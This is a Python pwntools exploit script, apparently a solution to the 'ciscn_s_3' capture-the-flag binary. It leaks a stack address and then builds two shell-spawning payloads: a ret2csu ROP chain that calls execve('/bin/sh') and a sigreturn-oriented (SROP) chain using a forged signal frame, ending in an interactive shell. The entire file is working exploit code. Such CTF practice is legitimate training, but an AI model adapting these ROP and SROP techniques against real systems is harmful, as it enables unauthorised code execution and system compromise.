from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('./ciscn_s_3')
leak_got = elf.got['__libc_start_main']

vuln = 0x004004ed
syscall = 0x00400517
ret = 0x00400519
# rdi
pop_rdi_ret = 0x004005a3
# rdx
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x0040059a
mov_rdx_r13 = 0x00400580
#conn = remote('node4.buuoj.cn',27244)
conn = process('ciscn_s_3')

#gdb.attach(conn, 'b *0x004004ed')

payload = b'/bin/sh' 
payload = payload.ljust(0x10, b'\x00')
payload += p64(vuln)
conn.send(payload)
res = conn.recv(0x30)[0x20:0x26]
binsh = u64(res+b'\x00\x00') - 0x118
print(f'binsh : {hex(binsh)}')
def exp1():
    mov_rax_59 = 0x004004e2
    
    payload = b'/bin/sh'.ljust(0x10, b'\x00')
    # r14 => rsi = 0
    # r13 => rdx = 0, r12 = syscall
    payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(0x1) + p64(binsh + 0x50) + p64(0) + p64(0) + p64(binsh)
    payload += p64(mov_rdx_r13)
    # r15 => rdi = binsh
    payload += p64(pop_rdi_ret) + p64(binsh)
    # rax = 59
    payload += p64(mov_rax_59) 
    payload += p64(syscall)
    conn.send(payload) 
    conn.recv()
    conn.interactive()

def exp2():
    mov_rax_15 = 0x004004da
    
    # fake signal frame
    fake_frame = SigreturnFrame()
    fake_frame.rax = 0x3b
    fake_frame.rdi = binsh
    fake_frame.rsi = 0
    fake_frame.rdx = 0
    #fake_frame.rsp = binsh + 0x10
    fake_frame.rip = syscall
    print(fake_frame)

    payload = b'/bin/sh'.ljust(0x10, b'\x00')
    #payload += p64(0x00400519)*3
    payload += p64(mov_rax_15) + p64(syscall) 
    payload += bytes(fake_frame)

    conn.send(payload)
    conn.recv()
    conn.interactive()
   
if __name__ == "__main__":
    exp1()
